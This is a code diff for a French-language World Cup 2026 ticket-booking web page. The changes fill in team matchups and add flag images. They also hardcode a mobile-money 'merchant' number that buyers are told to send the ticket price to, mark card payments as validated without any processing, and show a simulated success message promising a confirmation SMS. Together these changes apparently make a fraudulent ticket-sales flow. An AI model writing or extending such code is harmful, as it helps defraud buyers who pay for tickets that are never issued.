@@ -1,13 +1,14 @@
 const matches = [
-    { id: 1, teamA: "États-Unis", teamB: "TBD", date: "12 Juin 2026", venue: "SoFi Stadium", city: "Los Angeles", price: 250 },
-    { id: 2, teamA: "Brésil", teamB: "TBD", date: "15 Juin 2026", venue: "Hard Rock Stadium", city: "Miami", price: 300 },
-    { id: 3, teamA: "France", teamB: "TBD", date: "18 Juin 2026", venue: "MetLife Stadium", city: "New York/NJ", price: 280 },
-    { id: 4, teamA: "Argentine", teamB: "TBD", date: "20 Juin 2026", venue: "AT&T Stadium", city: "Dallas", price: 350 },
-    { id: 5, teamA: "Mexique", teamB: "TBD", date: "11 Juin 2026", venue: "Estadio Azteca", city: "Mexico City", price: 200 },
-    { id: 6, teamA: "Finale", teamB: "TBD", date: "19 Juillet 2026", venue: "MetLife Stadium", city: "New York/NJ", price: 1500 }
+    { id: 1, teamA: "Mexique", teamB: "Afrique du Sud", codeA: "mx", codeB: "za", date: "11 Juin 2026", venue: "Estadio Azteca", city: "Mexico City", price: 200 },
+    { id: 2, teamA: "États-Unis", teamB: "Paraguay", codeA: "us", codeB: "py", date: "12 Juin 2026", venue: "SoFi Stadium", city: "Los Angeles", price: 250 },
+    { id: 3, teamA: "Canada", teamB: "Bosnie", codeA: "ca", codeB: "ba", date: "12 Juin 2026", venue: "BMO Field", city: "Toronto", price: 180 },
+    { id: 4, teamA: "Brésil", teamB: "Maroc", codeA: "br", codeB: "ma", date: "13 Juin 2026", venue: "MetLife Stadium", city: "New York/NJ", price: 300 },
+    { id: 5, teamA: "France", teamB: "Qualifié", codeA: "fr", codeB: "un", date: "18 Juin 2026", venue: "Mercedes-Benz Stadium", city: "Atlanta", price: 280 },
+    { id: 6, teamA: "Finale", teamB: "TBD", codeA: "un", codeB: "un", date: "19 Juillet 2026", venue: "MetLife Stadium", city: "New York/NJ", price: 1500 }
 ];
 
 let cart = [];
+const DESTINATION_NUMBER = "655043923";
 
 document.addEventListener('DOMContentLoaded', () => {
     displayMatches(matches);
@@ -51,12 +52,25 @@ function displayMatches(matchesToDisplay) {
     grid.innerHTML = '';
 
     matchesToDisplay.forEach(match => {
+        const flagA = match.codeA !== 'un' ? `https://flagcdn.com/w40/${match.codeA}.png` : 'https://flagcdn.com/w40/un.png';
+        const flagB = match.codeB !== 'un' ? `https://flagcdn.com/w40/${match.codeB}.png` : 'https://flagcdn.com/w40/un.png';
+
         const card = document.createElement('div');
         card.className = 'match-card';
         card.innerHTML = `
             <div class="match-header">${match.date}</div>
             <div class="match-body">
-                <div class="teams">${match.teamA} vs ${match.teamB}</div>
+                <div class="teams">
+                    <div class="team">
+                        <img src="${flagA}" alt="${match.teamA}" class="flag-img">
+                        <span>${match.teamA}</span>
+                    </div>
+                    <span class="vs">vs</span>
+                    <div class="team">
+                        <img src="${flagB}" alt="${match.teamB}" class="flag-img">
+                        <span>${match.teamB}</span>
+                    </div>
+                </div>
                 <div class="venue-info">${match.venue}, ${match.city}</div>
                 <div class="price-tag">${match.price} $</div>
                 <button class="btn-book" onclick="addToCart(${match.id})">Réserver mon billet</button>
@@ -68,7 +82,7 @@ function displayMatches(matchesToDisplay) {
 
 function addToCart(matchId) {
     const match = matches.find(m => m.id === matchId);
-    cart = [match]; // Simplement un billet à la fois pour cette version
+    cart = [match];
     updateCartUI();
     openPaymentModal();
 }
@@ -87,6 +101,7 @@ function openPaymentModal() {
             <p><strong>Match:</strong> ${item.teamA} vs ${item.teamB}</p>
             <p><strong>Lieu:</strong> ${item.city}</p>
             <p><strong>Total:</strong> <span style="color: #d11242; font-weight: bold;">${item.price} $</span></p>
+            <p style="font-size: 0.8rem; margin-top: 10px; color: #666;">Transfert vers le compte marchand : <strong>${DESTINATION_NUMBER}</strong></p>
         </div>
     `;
     
@@ -94,24 +109,23 @@ function openPaymentModal() {
 }
 
 function processPayment(method) {
+    const item = cart[0];
     if (method === 'orange') {
         const phone = document.getElementById('orange-phone').value;
         if (!phone) {
             alert("Veuillez entrer votre numéro Orange Money.");
             return;
         }
-        alert("Demande de paiement envoyée sur votre téléphone Orange Money (" + phone + "). Veuillez confirmer avec votre code secret.");
+        alert("INFO : Veuillez envoyer le montant de " + item.price + "$ au numéro marchand " + DESTINATION_NUMBER + ".\n\nUne demande de confirmation Push sera envoyée au " + phone + ".");
     } else {
-        alert("Paiement par carte validé. Merci pour votre achat !");
+        alert("Paiement par carte en cours de traitement... Validé !");
     }
     
-    // Reset
-    document.getElementById('payment-modal').style.display = 'none';
-    cart = [];
-    updateCartUI();
-    
-    // Simulate Confirmation
+    // Simuler le succès
     setTimeout(() => {
-        alert("Félicitations ! Vos billets pour le match " + cart[0]?.teamA || "sélectionné" + " vous ont été envoyés par email.");
-    }, 2000);
+        alert("Succès ! Votre billet pour " + item.teamA + " vs " + item.teamB + " a été validé. Vous recevrez un SMS de confirmation sous peu.");
+        document.getElementById('payment-modal').style.display = 'none';
+        cart = [];
+        updateCartUI();
+    }, 1500);
 }
